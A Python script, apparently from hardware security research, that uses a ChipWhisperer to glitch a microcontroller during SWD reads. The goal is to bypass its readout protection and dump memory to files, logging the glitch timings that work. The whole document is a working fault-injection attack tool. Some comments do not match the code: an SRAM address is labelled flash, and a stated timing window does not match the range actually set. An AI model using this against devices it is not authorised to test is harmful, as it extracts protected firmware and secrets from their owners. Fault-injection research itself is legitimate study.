#!/usr/bin/env python3
"""
Flash Memory Dump via Glitching
Trigger on TIO3 (SWDIO activity)
"""

import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
from swd import Swd
import time
import os
from datetime import datetime

# Configuration
ENABLE_GLITCH = False  # Set to True to enable glitching, False to just test SWD reads

# Target memory range
#FLASH_START = 0x1FFF7860  # Start of flash storage area
#FLASH_END = 0x1FFF787F    # End of flash storage area
FLASH_START = 0x20000000  # Start of flash storage area
FLASH_END = 0x2000001F    # End of flash storage area
CHUNK_SIZE = 32           # Read 32 bytes at a time

def check_memory_read(address):
    """Try to read memory - success means RDP was bypassed"""
    try:
        swd = Swd()
        data = bytes(swd.read_mem(address, CHUNK_SIZE))
        if len(data) == CHUNK_SIZE:
            print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
            print(f"First 16 bytes: ", end="")
            for i in range(min(16, len(data))):
                print(f"{data[i]:02X} ", end="")
            print()
            return data
    except Exception as e:
        print(f" NACK", end="")
    return None

def save_memory_chunk(address, data):
    """Save memory chunk to file"""
    if not os.path.exists('FLASH'):
        os.makedirs('FLASH')

    # Save individual chunk
    filename = f"FLASH/0x{address:08X}.bin"
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"Saved to {filename}")

    # Append to combined file
    combined_file = "FLASH/flash_dump_combined.bin"
    offset = address - FLASH_START

    if not os.path.exists(combined_file):
        with open(combined_file, 'wb') as f:
            f.write(b'\x00' * (FLASH_END - FLASH_START + 1))

    with open(combined_file, 'r+b') as f:
        f.seek(offset)
        f.write(data)

def log_successful_glitch(address, ext_offset, width, offset, attempts, iteration):
    """Log successful glitch to master log file"""
    MASTER_LOG = 'FLASH/glitch_master_log.csv'

    # Create log file with header if it doesn't exist
    if not os.path.exists(MASTER_LOG):
        with open(MASTER_LOG, 'w') as f:
            f.write("Timestamp,Address,ExtOffset,Width,Offset,TimeToFind_sec,Attempts,Iteration,Timing_us\n")

    # Append successful glitch parameters
    with open(MASTER_LOG, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timing_us = ext_offset / 100  # Convert to microseconds
        f.write(f"{timestamp},0x{address:08X},{ext_offset},{width},{offset},0.0,{attempts},{iteration},{timing_us:.1f}\n")
        f.flush()

# Connect to ChipWhisperer
print("="*60)
print("Flash Dump Glitch Campaign - TIO3 Triggered")
print("="*60)

scope = cw.scope()

# Set up scope parameters
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio3'  # Trigger on TIO3 (SWDIO)
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20

# Configure TIO3 as input to monitor SWDIO
scope.io.tio3 = 'high_z'
# TIO2 will mark the read operation timing

# Glitch controller setup
g_step = 10  # Steps of 0.1 microseconds
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)

# Glitch parameters from glitch_memory_read_nrst.py
width_min, width_max = 40, 40
offset_min, offset_max = -45, -45
ext_offset_min, ext_offset_max = 0, 100000  # 900µs to 1ms

gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min} to {width_max}")
print(f"  Offset: {offset_min}")
print(f"  Ext_offset: {ext_offset_min/100:.1f}µs to {ext_offset_max/100:.1f}µs")
print(f"  Step: {g_step/100:.1f}µs")
print(f"  Trigger: TIO3 (SWDIO)")

sample_size = 15  # Attempts per setting

print(f"\nTarget range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"Chunk size: {CHUNK_SIZE} bytes")
print(f"Sample size: {sample_size} attempts per setting")
print("="*60)

input("\nPress Enter to start (Ctrl+C to exit)...")

current_address = FLASH_START
total_attempts = 0

# Main glitch campaign loop
while current_address <= FLASH_END:
    print(f"\n🎯 Target: 0x{current_address:08X}")

    address_found = False

    for glitch_setting in gc.glitch_values():
        scope.glitch.width = glitch_setting[0]
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[2]

        print(f"Testing ext_offset: {scope.glitch.ext_offset/100:.1f}µs ", end="")

        for i in range(sample_size):
            print(f".", end="", flush=True)

            # Arm scope - will trigger on SWDIO activity
            if ENABLE_GLITCH:
                scope.arm()

            total_attempts += 1

            # Set TIO2 high to mark start of read operation
            scope.io.tio2 = True

            # Attempt memory read - SWDIO activity will trigger glitch
            data = check_memory_read(current_address)

            # Set TIO2 low to mark end of read operation
            scope.io.tio2 = False

            if data:
                print(f"\n✅ GLITCH SUCCESS at ext_offset={scope.glitch.ext_offset/100:.1f}µs")
                save_memory_chunk(current_address, data)
                # Log the successful glitch parameters
                log_successful_glitch(current_address, scope.glitch.ext_offset,
                                    scope.glitch.width, scope.glitch.offset,
                                    total_attempts, i+1)
                print(f"📝 Logged to FLASH/glitch_master_log.csv")
                current_address += CHUNK_SIZE
                address_found = True
                break

            # Reset after all attempts for this glitch setting
            scope.io.nrst = False
            time.sleep(0.1)
            scope.io.nrst = 'high_z'
            time.sleep(0.5)

        if address_found:
            break
        else:
            print(" Failed")

    if not address_found:
        print(f"⚠️ Failed to glitch 0x{current_address:08X}, skipping")
        current_address += CHUNK_SIZE

print("\n" + "="*60)
print("Campaign complete!")
print(f"Total attempts: {total_attempts}")
print("="*60)